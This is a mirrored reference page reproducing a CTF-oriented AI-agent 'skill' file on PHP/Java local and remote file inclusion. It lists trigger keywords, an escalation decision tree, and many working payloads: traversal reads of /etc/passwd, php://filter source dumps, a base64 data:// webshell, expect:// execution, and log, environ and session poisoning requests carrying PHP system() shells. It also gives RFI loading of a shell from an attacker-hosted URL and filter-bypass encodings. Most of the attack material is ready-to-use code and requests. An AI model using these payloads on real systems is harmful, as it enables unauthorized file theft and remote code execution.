# File Inclusion — LFI / RFI

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/file-inclusion-lfi-rfi.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/file-inclusion-lfi-rfi.md)

---

---
name: file-inclusion-lfi-rfi
category: web
triggers: [lfi, rfi, "local file inclusion", "remote file inclusion", "path traversal", "directory traversal", "../", "php://filter", "php://", "data://", "expect://", phar, "log poisoning", "/etc/passwd", "proc/self/environ", "?page=", "?file=", "?include=", wrapper, "filter chain"]
tools: [curl, ffuf, burp, wfuzz, "php_filter_chains_oracle_exploit", liffy]
priority: high
description: Read arbitrary files via traversal/wrappers and escalate LFI to RCE through log poisoning, PHP filter chains, wrappers, and phar.
---
# File Inclusion — LFI / RFI

## Trigger context
- Parameters that name a file/page/template/language: `?page=`, `?file=`, `?include=`, `?path=`, `?template=`, `?lang=`, `?view=`, `?doc=`, `?module=`, `?load=`, `?content=`.
- Signals: value appears in a filename (`page=about` → `about.php`), errors leaking paths (`failed to open stream`, `include()`), `.php`/`.html` auto-appended.
- Stack matters: PHP (`include`/`require`) → wrappers + filter chains; Java (`?file=` → `../../WEB-INF/web.xml`); Node (`res.sendFile`); classic OS traversal anywhere.

## Objective
Read sensitive files (creds, source, flag), then escalate to **RCE**: log poisoning, `/proc/self/environ`, PHP filter chain, `data://`/`expect://` wrappers, phar deserialization (see [insecure-deserialization](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--insecure-deserialization.md)), or session file poisoning.

## Methodology (decision tree)
1. Baseline: does the value hit the filesystem? Try `?page=/etc/passwd` and `?page=../../../../etc/passwd`.
2. If a suffix is appended (`.php`) → strip it: null byte `%00` (PHP <5.3.4), path truncation, or a wrapper that ignores suffix (`php://filter`).
3. Traversal blocked/filtered → apply Branching logic (encoding, nested, absolute).
4. Confirm read primitive works → dump source with `php://filter` base64 (reveals more params, creds, further LFI).
5. Escalate to RCE, in order of reliability:
   a. **PHP filter chain** (no file write needed, GET-safe) — best modern default.
   b. **Log poisoning** (access.log, error.log, mail, SSH auth.log) if log path readable.
   c. **/proc/self/environ** (inject via User-Agent) if readable + PHP includes it.
   d. **PHP session** poisoning (`/var/lib/php/sessions/sess_<PHPSESSID>`).
   e. **data://** / **expect://** wrappers if `allow_url_include=On`.
   f. **RFI**: host a shell if `allow_url_include=On` (`?page=http://you/shell.txt`).
   g. **phar://** deserialization if a gadget class is autoloaded.

## Commands & payloads
```bash
# File read
curl 'http://T/?page=../../../../../../etc/passwd'
curl 'http://T/?page=....//....//....//etc/passwd'          # nested bypass
curl 'http://T/?page=/etc/passwd%00'                        # null byte (legacy PHP)
# High-value targets
/etc/passwd  /etc/hosts  /proc/self/environ  /proc/self/cmdline  /proc/self/fd/0-20
/var/log/apache2/access.log  /var/log/nginx/access.log  /var/log/auth.log
../../../../var/www/html/config.php   C:\Windows\win.ini   C:\inetpub\wwwroot\web.config
```
```bash
# Read PHP source (suffix appended? filter wrapper still works)
curl 'http://T/?page=php://filter/convert.base64-encode/resource=index.php' | base64 -d
curl 'http://T/?page=php://filter/read=string.rot13/resource=config'

# LFI->RCE via PHP filter CHAIN (no write, GET only) — automate:
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit
python3 filters_chain_oracle_exploit.py --target http://T/ --file '/etc/passwd' \
  --parameter page   # confirms oracle, then use generator to build a chain that emits <?php system($_GET[0]);?>

# data:// wrapper (needs allow_url_include=On)
curl 'http://T/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/PA==&0=id'
# expect:// wrapper
curl 'http://T/?page=expect://id'
```
```http
# Log poisoning: 1) inject PHP into a logged field, 2) include the log
GET / HTTP/1.1
Host: T
User-Agent: <?php system($_GET['c']); ?>

GET /?page=/var/log/apache2/access.log&c=id HTTP/1.1
```
```http
# /proc/self/environ poisoning (if readable)
GET /?page=/proc/self/environ&c=id HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>
```

```bash
# PHP session poisoning: write PHP into a session var (e.g. username), then include the session file
# 1) set a value that gets stored: POST username=<?php system($_GET[c]);?>
# 2) include it (PHPSESSID from your cookie):
curl -b PHPSESSID=abc123 'http://T/?page=/var/lib/php/sessions/sess_abc123&c=id'
# Other writable-then-include sinks: /tmp/, mail spool /var/mail/<user>, /var/log/vsftpd.log (FTP USER)
```
```
# Wrapper cheat-sheet (PHP):
php://filter/convert.base64-encode/resource=X     read source (no exec)
php://filter/read=convert.iconv.UTF8.CSISO2022KR  building block for filter-chain RCE
php://input        (POST body executed if allow_url_include=On; page=php://input)
data://text/plain;base64,...      inline code (allow_url_include=On)
expect://id                        direct exec (expect ext, rare)
phar://upload.phar/x               triggers metadata unserialize -> see insecure-deserialization
zip://upload.zip%23shell.php       include file inside an uploaded archive
```

## Branching logic
- **`../` stripped once** → nested `....//`, `..././`, `.....///`.
- **URL-decode filter** → double-encode `%252e%252e%252f`; overlong UTF-8 `%c0%ae%c0%ae/`.
- **Suffix `.php` appended** → filter wrapper (ignores suffix), null byte (legacy), or path-truncation `?page=../../etc/passwd/./././...` (~4096 chars).
- **`allow_url_include=On`** → RFI (`http://`, `ftp://`, `data://`, `php://input` with POST body) and remote shell.
- **`allow_url_include=Off`** (common) → local-only escalations: filter chain, log/session/environ poisoning, phar.
- **Prefix forced** (e.g. `/var/www/pages/` prepended) → absolute-path won't work; stay relative with traversal, or use wrapper on a known-included file.
- **Windows target** → `..\..\` and `/`; targets `win.ini`, `web.config`, `boot.ini`, IIS logs `C:\inetpub\logs\LogFiles\`.
- **Java app** → no wrappers; read `WEB-INF/web.xml`, `.class`, `application.properties`; traversal only.

## Common pitfalls
- Filter chains are the most reliable modern LFI2RCE — try them before hunting a writable log.
- Null-byte only works on PHP < 5.3.4; don't waste time on modern targets.
- Log poisoning fails silently if the log path isn't world-readable or PHP tags get HTML-escaped — verify you can read the raw log first.
- `php://filter` base64-encode never executes code — it's a read primitive; you still need a chain/wrapper for RCE.
- `data://`/`expect://` need specific `php.ini` settings (`allow_url_include`, expect ext) — often off.

## Proof / verification
- File read: paste `/etc/passwd` root line or the flag file contents.
- Source disclosure: decoded base64 of a `.php` file.
- RCE: output of `id`/`whoami`/`hostname`, or read the flag via `system('cat /flag')`.

## Cross-references
[ssrf](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssrf.md) · [insecure-deserialization](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--insecure-deserialization.md) · [file-upload](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-upload.md) · [xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md) · [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md)

## Credible sources
- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
- https://github.com/synacktiv/php_filter_chains_oracle_exploit
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
- https://portswigger.net/web-security/file-path-traversal
